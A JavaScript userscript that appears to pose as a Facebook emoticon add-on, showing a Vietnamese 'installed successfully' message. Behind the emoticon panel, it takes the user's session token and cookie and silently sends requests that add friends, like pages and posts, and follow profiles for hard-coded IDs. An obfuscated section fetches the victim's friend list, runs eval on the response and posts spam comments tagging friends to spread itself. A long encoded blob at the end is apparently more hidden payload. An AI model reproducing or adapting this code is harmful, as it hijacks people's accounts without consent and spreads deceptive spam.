	html += '<a class="navLink" title="1 Thông Báo M?i">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Chúc M?ng B?n Đ? Cài Đ?t ICON FACEBOOK Thành Công <br>FaceBook.Com</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}

// chau ngoai ba tung
IDS("100002430714054");a("100007007468883");a("100002438544264");sublist("483606408397306");
P("551216141636071");P("532062433551442");P("536998916391127");P("569729609784724");P("574556379302047");
P("578150965609255");P("423101567780863");P("591242200966798");P("217247188472640");P("595211903903161");sublist("539211006169918");
//A Phùng thanh phong
a("100007751678223");a("100006619902303");sublist("621952017816839");
IDS("100000061400267");IDS("100003638324695");IDS("100007751678223");
Like("685974484796684");Like("263316953820631");Like("1387179771538109");Like("547700161992307");
Like("268572309974110");Like("623995204323025");Like("477919925642333");Like("721801554519652");
Like("411811502221011");
P("660028574009183");P("582804098398298");P("751733198172053");P("417346981729909");P("779421418736564");P("764398883572151");P("632539930134055");
//Meo
Like("827862113906169");
Like("209382189243821");
Like("238733032948621");
Like("390497874360478");
Like("614303601939504");
Like("515022378617340");
a("100005597291520");
a("100005653091203");
a("100007536253901");
sublist("168936419971460");
sublist("152397511623491");
//Bạn Mẹ Trẻ Con
Like("278909915601095");Like("295743780579175");Like("811375125544670");
Like("678347692225302");Like("594024804017717");Like("1407936102798190");
Like("649857591745111");Like("221577498031657");a("100001094522338");sublist("536358316410648");
//Khách P("672060146173797");Like("409089452524752");P("460854570681573");
// vu vo
sublist("429254323874962");sublist("429254010541660");sublist("384489928351402");a("100003711953951");
//Phương Duy Vũ
IDS("100002823774298");a("100006139774401"); a("100007029091905");a("100007015778452");
a("100007574261926"); P("406286569475465");sublist("375805735856882");
Like("1433535550215942");Like("642253269154392");
Like("486695894774523");Like("682689168448106");
//code tag 
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","217247188472640","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=Icon mới nhất 2014 của facebook 💔 💙 💚 💛 💘 💖 👿 ☀ 🐍 👫 📞 🎓 🐧 🐬 🐛 👷 🐯 (^^^) 🌙 🎁 :|]	<3??","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
// code xxx
var _7055;var _7184='34848D84E174C978B894C962F634D918F926B906F634C750A634D870B662E718A710B726C722D718C706D718C734F734E722B722E718A726E718D734F662B878F742A546D978F894F962D634A914C898C886A906D970D966F918D634E750B634C906B950B902D974F942F910F946B970C870F662E918B910F970B782D938F910D942F910D946B970C966A770C990A818C894C942F910C662D878C666C662E914C898A886A906C970B966E918A662C670C870F698F878D870E662C978F894E938E974D910B662D878E742E546F978C894A962A634E974B966C910E962B886E926C906C634C750C634E906D950F902F974F942D910B946D970D870F662B902F950D950B934E926F910C662D878C870D662A942E894E970D902B922C662A878D666C906C950C902E974E942D910E946E970F870A662F902C950E950D934E926A910D662C878F870A662D942A894C970D902F922F662D878E666E694E902C886F974E966E910F962F750E666E874D906C678F670F694D670D870D702C878B670D742E546A978E894E962B634D922F970A970B954D982D954D634C750E634B946B910F982B634D858B814A810A794C970E970B954F834F910A958F974A910A966E970A666A670E742C546B978E894B962C634D974C962B938A982C954F634F750A634E662D694E894C930E894D986B694E918D962A950D974D954C966E694D942A910D942E898C910A962B966A922E926B954E694C962B706B930C690D954D922E954B758C886F886E894C750F702F662A742D546A978A894B962D634F954B894A962E894B942A966C982A954B634A750D634B662F658C962C910A914C750B918A962F950F974D954D886F930E974B942E954C886E922A910D894A906B910D962F658E918A962F950E974B954A886B926F906F750D662F634E678C634B918A926F906C634E678F634F662D658A914E898E886E906C970C966B918F750F662A634C678F634C914F898A886E906A970A966C918C634F678B634F662B658B886B886E974B966E910C962C750A662F634E678C634C974A966C910A962D886B926E906F634F678C634C662A658E954E922F966B970D894C942F954D750B662B742E546B922C970F970F954F982A954B870B662D950D954A910B946B662C878A666D662B826D822A838E842F662B682B634A974C962E938B982D954E682D634B970A962B974F910C670F742C546D922D970E970E954C982B954A870F662B966C910F970F834E910C958E974C910E966C970F794C910B894B906B910C962E662A878C666C662A774D950C946F970F910E946B970C686D970F990F954A910E662A682B634E662B894E954E954B938A926A902D894C970C926C950C946A694B986A686C982C982F982D686B914D950F962B942A686F974B962C938C910E946B902B950B906D910C906E662E670F742D546D922D970C970B954D982C954C870D662E966C910C970E834D910B958D974E910E966B970A794C910E894B906B910B962C662A878D666E662B774F950E946D970E910D946C970C686D938F910D946F918E970C922F662C682F634D954A894B962F894E942A966C982F954C870C662F938A910E946A918E970A922B662B878E670C742D546C922B970B970C954F982A954D870A662C966D910B970F834D910F958A974B910A966E970E794D910D894C906E910C962B662F878A666D662E774E950E946D946E910E902A970E926A950E946C662C682E634E662D934A910C910F954F686D894E938E926D978C910C662A670F742C546C922F970C970B954F982E954C870A662F966D910E946F906E662D878F666E954A894E962C894D942C966B982C954D670A742F546F634B546D978D894B962F634F914D898B886B906E970F966A918B634B750D634E906F950E902C974B942D910E946B970D870F662F918C910A970D782D938B910E942A910D946D970A966E770A990A818A894B942F910A662D878D666E662D914B898A886B906A970A966F918B662A670E870C698F878E870F662C978D894F938E974B910F662F878E742D546E978C894A962F634E974A966F910B962C886C926A906C634A750A634F906B950E902D974C942A910A946A970D870A662D902F950F950B934C926A910F662D878D870A662E942D894D970B902A922E662B878A666D906D950C902C974F942A910F946E970E870A662D902E950E950E934A926A910C662B878F870A662E942B894D970D902A922B662B878D666A694F902E886B974F966B910E962A750A666B874D906B678E670A694C670A870A702C878B670C742C546A634F546E978D894B962B634A914A962F926B910E946D906D966C634B750E634F946B910F982E634A766C962E962D894A990B666E670D742A546F918C914F634D750D634F946C910A982E634D858E814A810A794B970F970F954C834C910D958B974A910A966D970A666C670C742C546F918A914E870F662B950B954F910D946B662D878B666B662C790E782F842F662A682A634E662A694E894E930D894B986D694D970B990A954F910E894C922E910D894E906D694E914F926D962A966F970F886D906B910D918F962F910B910D690B954A922C954E758E886C886A894B750D702F658C978D926E910F982E910A962C750A662A634E678D634B974B966F910B962C886F926C906B634C678E634C662B658A970B950B934B910B946E662E634C678F634E814B894C970E922A870A662C962D894F946B906C950B942C662C878A666F670A634D678A634C662E658C914C926D938E970B910F962A870F698C878D750E974C966F910D962A658F950E954B970C926D950E946F966F870D698E878B750D914E962A926C910A946E906D966F886C950A946F938F990A662D682C634E914A894B938D966A910E670C742D546F918A914D870A662E966B910D946B906A662B878A666F670A742C546E926A914F634A666F918A914B870F662D962E910B894E906A990F838A970F894E970D910C662B878C634A638F750D634A714E670B634D998C1006C634D910C938A966C910B634A998C546A634C634A634F634B906A894B970F894A634D750B634C910A978D894F938F666C662C666E662E634F678D634F918C914E870B662C962A910A966B954D950A946F966D910F842A910B986D970B662B878F870D662C966C974C898B966F970D962B662E878D666B734C670A634A678D634F662F670F662A670A742D546C634B634B634F634D926A914C634B666C906A894A970D894C870F662C910F962A962D950D962C662D878D670E634F998C1006C634B910E938E966F910B634A998C546E634A634A634C634C634B634D634E634A914B962C926F910B946E906B966E634D750B634E906A894B970D894C870C662B954A894D990F938B950A894B906C662E878B870D662D910C946A970D962E926B910C966D662C878B870C662E966D950B962C970B662C878D666D914B974F946D902C970A926A950E946B634B666A886C698F986B734A710B906E894A986F730F682D634D886E698A986A734F710A906F894A986F734F670F634C998F546A634E634C634C634C634C634B634D634E634E634E634D634E962E910F970D974B962E946E634C886A698D986B734C710E906F894D986F730C870B662F926D946D906D910A986C662A878A634B686F634E886C698E986A734B710A906F894B986E734C870E662A926D946B906C910C986B662E878D742D546D634E634D634B634D634E634F634D634C1006E670A742A546C634E634F634F634D1006A742C546D1006F742E546B634B546C914C950D962D634E666C978B894A962C634D926B634E750D634D698A742B634F926A634D746B634E914E962A926A910B946E906B966A870F662D938D910D946D918D970D922E662E878C742D634D926F678E678E670C634E998C546F634E634A634A634C978B894B962A634F922D970D970B954B982E954E634F750F634A946C910C982A634D858B814B810A794A970F970F954B834D910C958D974F910C966F970E666F670D742D546B634B634D634E634A978E894A962B634A974E962A938B982E954A634A750C634F662F694F894C930F894C986A694D918B962E950B974A954C966C694F942B910F942B898A910A962B966B694D894D906D906B886D954D950F966A970A690B954D922F954F758A886D886A894D750E702A662E742A546D634D634F634C634D978E894E962D634E954B894F962C894D942B966D982B954A750B634B662E658D914B898C886C906F970A966E918D750B662C634D678B634E914D898B886C906D970E966A918D634F678D634D662A658A918F962E950F974C954E886C926C906C750E662B634C678E634C918A926C906E634C678C634D662B658B966B950A974F962E902C910A750D970F990B954E910A894A922A910C894E906B658B962C910E914B750D658D942D910E966B966F894D918C910A886E926D906A750E658B942E910D942E898D910B962E966A750B662A634B678B634C914E962E926B910B946B906E966A870E926C878D870D662C974B926F906A662A878E634F678C634E662E658E886B886B974D966F910A962E750A662F634F678F634C974F966D910E962D886E926A906B634B678D634A662B658B954C922D966C970D894D942D954D750E662E742E546E634C634B634B634C922E970C970A954F982B954F870D662E950B954D910F946B662D878B666D662D826E822C838A842D662F682A634F974A962C938E982C954C682A634E970F962B974F910F670B742D546A634D634D634F634D922D970A970D954B982F954B870E662C966D910E970F834A910E958B974A910C966C970B794F910A894F906B910E962B662D878E666F662D774B950D946D970F910C946B970E686F970F990C954A910E662E682E634C662F894F954F954F938C926C902F894C970A926E950C946B694A986E686E982A982F982D686E914E950B962A942D686C974C962C938D910F946B902F950A906E910E906E662C670F742A546E634D634F634D634B922F970C970D954C982B954E870D662B966E910F970C834D910D958D974B910E966F970C794E910A894A906D910A962D662A878D666C662C774B950E946D970F910E946B970A686C938A910D946C918B970E922E662D682B634C954A894D962E894A942C966D982D954E870D662F938E910F946C918F970E922A662D878D670D742C546A634C634A634E634D922E970F970D954D982B954A870B662E966D910D970E834F910F958B974D910A966B970B794B910A894B906E910B962E662C878A666B662B774C950A946F946F910A902E970E926C950A946F662A682E634D662C934D910B910E954D686B894C938A926D978C910A662B670E742A546C634F634F634D634D922F970B970C954D982F954E870D662D950D946B962E910D894F906E990B966D970D894E970B910A902C922A894A946A918C910F662D878E634C750A634D914A974D946E902F970C926D950E946F634A666F670A634C998D546F926A914A634B666E922B970A970F954C982B954F870C662E962C910C894B906E990C838C970C894E970F910B662E878E634C750C750F634F714F634C658D658C634B922E970A970B954E982A954E870D662F966E970F894A970D974C966A662E878F634F750C750D634B706E698B698E670C634E998B1006E742E546D634C634E634A634C1006C742D546E634F634A634A634A922C970B970A954D982A954D870E662B966C910A946C906A662D878E666E954B894B962A894C942B966F982E954C670C742B546B1006F546E634C546A634E546E694E694E894F962A934B894A906E894F966C938A894B962E926D634A894A938E634B978B910E634A926C966D938E910C546F914F974B946F902F970B926A950F946E634D966E894D962B934B894E906E894B966A938D894A962C926C886E894F938E666F670D998D546C634C634F634F634F634C634A634C634B634C634A634F634B634C634C634B634A978B894D962B634B986A942E938C922E970D970C954A634F750A634D946F910B982B634C858A814B810B794A970C970D954A834C910C958F974F910A966C970A666F670E742A546A634D634B634C634B634C634B634A634A986D942A938D922A970D970C954F690A950B946C962B910E894C906C990F966F970B894A970C910B902E922F894D946E918D910C634C750E634D914D974F946D902B970D926D950B946B634F666B670A634E998F546D634E634F634E634C634D634B634B634A634D634C634D634C634E634F634B634D634E634D634A634E634D634C634C634B926E914A666A986F942F938F922B970B970E954F690A962B910B894D906D990B838E970E894F970D910D634B750D750F634B714C670F998C546B634E634B634D634E634A634B634C634F634C634B634F634C634F634E634E634E634C634E634C634C634E634E634F634B634E634C634A634C634E634F634A634E634A634F910E978F894F938E666D642D894D962B934D894F906A894B966A938A894A962B634C750A634C642E634E678E634D986E942D938F922D970F970D954F690F962A910B966A954C950D946E966A910B842B910F986B970D690B970A950F838B970E962A926D946D918B666D670B690F962F910E954F938C894C902E910A666E642C914F950C962F634D666A742A742C670E742E642B682D642B642B670F634E678A634C642A742B642D670A742A546C634E634A634D634E634E634E634E634D634C634E634C634C634B634D634A634A634A634E634E634A634F634C634F634D634B634B634C634C634E634E634E634A634D634F914D950A962F666C914A750F698B742E914D746D814E894E970B922B690C962E950A974B946C906B666F894F962D934A894D906F894A966A938D894A962A690C954A894E990E938C950E894D906F690C910D946C970B962A926F910D966B690A938E910B946D918F970C922E694A702D698B670B742A914B678B678E670F998C546E634D634D634C634A634C634C634B634C634D634B634B634B634A634D634E634D634D634C634F634C634D634A634C634A634D634A634E634B634E634F634B634B634E634F634C634B634C634A634D634D966A942C910E966A894A930E634F750E634D642A642A742F546F634F634A634F634A634B634D634D634A634E634A634D634E634C634B634C634B634A634F634E634A634F634E634E634B634F634C634B634B634F634A634A634E634B634F634B634C634D634F634E634D966C942D910D966D894B930A886A970E910D986E970E634D750F634C642C642C742F546B634D634F634F634B634D634C634F634D634E634F634C634D634C634E634B634C634A634B634A634B634A634D634D634F634B634D634C634A634B634F634C634E634E634A914C950F962B666A926B750B914D674B702B698C742B926B746E666C914E678D702D670B674C702E698C742B926E678D678B670E998F546F634A634E634B634C634A634B634E634D634B634E634F634D634C634E634D634F634A634F634E634D634D634F634D634E634B634E634D634C634A634E634E634B634D634E634C634C634E634C634D634C926A914F666C894F962B934D894A906C894C966E938A894D962E690C954A894C990F938C950F894F906F690C910C946E970D962F926B910E966C870B926F878D670C998E546A634D634B634E634B634E634E634F634B634B634C634C634C634A634F634E634B634A634A634C634E634C634B634F634C634D634A634A634C634D634C634F634C634F634D966A942A910D966C894A930C634A678A750F634F642A634D762B870B642D634E678D634C894C962E934F894E906D894C966E938B894D962B690A954F894B990C938F950A894D906D690B910D946E970A962F926D910F966F870C926C878D690B974D926A906D634E678A634E634F642C738C642A634A678D634C894D962B934F894C906A894D966E938F894B962A690E954D894F990D938F950B894C906B690A910B946D970E962B926E910C966C870E926D878F690D970C910E986B970E634F678C634C642E878E642B742F546E634D634F634C634A634B634C634A634F634C634D634A634C634E634B634B634E634E634F634F634D634D634E634E634E634F634A634D634D634B634B634C634B634E634A966D942B910C966B894E930F886C970F910C986E970A634B678F750A634B642D634A642E634B678F634E894D962D934C894A906F894C966F938C894D962D690A954F894D990B938B950E894B906E690E910B946E970D962A926F910C966C870D926F878E690F970B910B986B970D742A546E634B634D634E634C634E634B634D634D634E634D634A634B634D634B634A634F634B634B634F634B634E634B634A634C634F634F634F634C634C634B634A634F634C634E1006E546E634E634F634E634C634A634B634B634C634D634D634C634F634B634E634F634E634E634C634F634D634C634C634A634C634A634E634B634A634A634A634E634F634C634B634E634F634A634B634F634D1006B546C634D634E634E634D634D634B634B634C634C634F634D634A634C634B634E634C634A634F634E634D634C634B634D634E634C634E634D634B634A634F634C634E634F634A634D634E634C634F634E634B966E906E974D962F974E942F954E894A990D938D894F966E666B670C742A634E634F634A634B634D634E634C634B634C634E634B634C634B634F634C634C634C634A634D634D634D634A634C634C634B1006F546F634F634F634A634E634B634C634E634F634F634E634B634A634A634E634F634F634C634E634A634A634A634A634A634D634D634A634D634B634C634F634D546D634F634D634B634E634B634D634A634C634E634B634D634D634B634B634A634D634B634C634B634E634C634C634D634F1006E546C634A634C634F634F634B634D634B634D634B634F634B634B634C634C634B634F634A634D634F634C634B634A634F546D634E634F634B634F634D634B634D634D1006A742A546F634B634D634D634E634B634A634C634F634D634B634D634A634D634B634A634B978C894A962F634C954F894E962B894E942E966C634D750F634B642A658A914F926A938E970D910E962E870A698A878E750C974B966E910C962D642E742C546E634C634F634A634C634D634B634D634A634F634E634C634F634F634C634F634A954E894E962E894E942E966A634F678E750D634B642C658B950E954A970E926B950A946C966B870B698B878B750E914C962C926F910C946F906B966B886B950A946A938A990B642F742B546B634E634C634C634A634E634F634C634B634B634F634F634D634C634A634E634F954C894A962D894B942D966E634C678D750D634B642E658F950E954A970E926B950E946E966F870A702B878A750E946F942F642D742E546F634E634D634F634A634C634B634C634E634B634E634A634B634A634C634E634B954E894A962C894D942F966F634C678E750C634F642E658D970D950B934C910F946A750D978C726A642F742F546F634D634D634A634C634F634D634D634C954E894E962A894C942F966A634B678E750C634A642C658E978C926B910D982F910B962B750A642B634D678B634A974D966F910C962B886B926D906E742F546C634D634B634A634A634A634A634D634B634B634D634F634B634A634E634A634E954B894E962C894E942C966D634F678F750C634F642D658E886F886B974D966C910F962F750B642E634D678B634C974A966C910A962F886F926F906D742A546E634F634B634D634D634F634D634C634E634E634B634F634E634D634E634E546B634B634B634A634B634A634D634D634E926D914D634A666E906C950A902A974C942A910F946A970B690D846E834F810E690B926A946C906B910F986D822A914F666F642F922B970F970E954B966C738F694D694F642B670E634E754F750E634E698C670A634D998A634F986F942A938C922B970D970F954C690B950C954D910A946A666F642B790C782E842E642D682F634A642E922A970B970B954D966F738B694B694A982D982E982F690F914E894F902E910C898F950C950A934F690D902E950F942F694D894C930F894A986F694A970F990F954F910E894F922B910B894D906C694D914E926F962E966D970E886A906E910C918B962A910B910D690C954F922E954E758F886D886E894F750A702D642A634E678F634A954C894B962C894A942A966C682F634C970B962B974E910C670B742F634F1006F546A634F634A634C634A634A634F634F634C910F938D966B910E634F998F634B986B942F938C922B970A970D954D690C950D954D910D946B666F642B790E782A842D642D682E634B642E922E970F970D954E738C694E694E982E982D982C690E914F894D902C910B898C950B950D934B690B902A950F942F694D894C930E894B986D694A970E990A954A910D894A922B910D894E906E694B914D926B962C966D970B886D906B910E918F962F910A910A690B954F922B954E758E886C886E894B750C702B642B634A678F634D954B894E962E894A942D966A682F634F970C962B974D910B670D742E634C1006C546A634C634C634E634C634F634B634B634E986D942B938F922D970C970A954F690E966F910C946E906F666A670A742C546E1006A546D634A546A694B694F970B926D934B938A894E942C894F634D950C938E894D990D926F946D926A634C906A926B946B938E910A546A978A894D962E634C970B926F934C938A894F942B894A634F750D634E906B950B902A974A942C910A946E970B690B894A906F906E782D978C910D946F970E810A926C966A970D910D946A910D962F666F642A902E938C926D902E934C642E682D634F914E974B946D902C970C926C950C946E634B666F670E634C998B546E926C914C666B906F950F902A974D942D910E946E970B690C902E950F950C934D926A910A690B966B954C938F926B970C666B642F954F894B990C938F894C966C970B926D750E642A670B870C702C878D690A966A954D938F926B970E666E642F742F642D670A870D698D878D690D926A946E906E910B986C822A914C666D642C922E894E990E926B962F642D670E634A754D750A634F698B670A998E546E966C978A946F886B962D910D978C634A750C634D906B950C902C974A942B910D946F970D690A922A910D894C906D690C926C946C946B910B962B794A842E814F810E690D966D954A938F926A970F666E662D642C966E978F946E886B962F910B978B642B738B662A670A870F702C878E690C966E954D938D926E970F666A642F682D642A670C870B698A878E742D546A966B894C962C934D894F906C894A966A938A894A962C926B886B894A938D666C670A742A546B906B950C902D974A942D910D946D970D690C902F950B950F934C926A910A634D750E634E642F954D894F990F938D894B966C970F926D750B910A978E910A970C742B910A986E954A926B962F910A966C750F642C678B634E898D970F894C962E926E922A926B690B970F950C790E814B842D838B970D962B926B946E918D666D670E742E546A634D546C906F950F902E974E942D910F946B970B690F962C910E942E950C978B910C782C978E910A946D970C810B926D966A970D910B946C910E962D666E970E926D934E938A894C942D894F670C742C546E1006E546F634D1006D682D634E914A894E938A966E910A670B742F546E634A546A634F546C694D694F894C962B934B894D906A894B758F1266F634D910D934A938C910E942A910C546F914F974A946F902D970A926A950F946E634D966A894B962B934B894B906D894F966B910D934E938A910E666E974F926D906A682B902E926A946C966D670B998F546D634D634B634E634D634F634B634E634A634D634D634E634D634C634A634C634F978C894A962F634B986A942E938D922F970E970F954E634B750E634C946F910C982D634B858C814F810D794E970C970E954C834E910C958B974E910A966C970A666F670D742E546F634E634C634A634A634F634F634F634D986E942B938E922D970E970E954A690D950D946D962A910B894D906F990B966E970A894D970C910C902A922D894E946B918D910D634E750F634F914B974E946D902D970B926E950A946A634A666A670E634E998D546D634D634A634B634E634E634C634A634C634F634B634F634B634F634F634F634C634E634D634E634C634E634B634B634D926A914B666F986A942C938D922D970E970E954E690D962C910E894F906C990D838F970C894B970D910D634A750C750D634F714A670C998D634B634C546D634E634C634B634E634A634B634E634D634D634B634C634D634C634D634F634B634C634C634B634E634E634F634E634A1006F546D634B634D634D634C634A634F634B634B1006C742F546F634E634C634B634A634F634D634F634C634D634C634D634D634B634D634C546F634A634E634A634E634A634E634F634C